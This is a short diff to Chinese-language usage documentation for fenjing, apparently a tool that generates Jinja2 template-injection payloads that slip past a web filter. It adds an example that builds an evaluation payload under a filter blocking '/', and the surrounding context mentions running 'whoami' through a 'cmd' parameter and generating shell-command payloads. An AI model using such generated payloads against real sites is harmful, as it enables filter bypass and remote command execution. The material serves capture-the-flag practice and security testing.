@@ -124,6 +124,21 @@ print(r.text)
 # 然后使用`?cmd=whoami`就可以在header里看到命令执行结果了
 ```
 
+也可以这样直接给定表达式而不是给定字符串的值
+
+```python
+import fenjing
+
+def waf(s):
+    return "/" not in s
+
+full_payload_gen = fenjing.FullPayloadGen(waf)
+payload, will_print = full_payload_gen.generate(fenjing.const.EVAL, (fenjing.const.LITERAL, '"1"+"2"'))
+if not will_print:
+    print("这个payload不会产生回显")
+print(payload)
+```
+
 ### 根据WAF函数生成shell指令对应的payload
 
 ```python
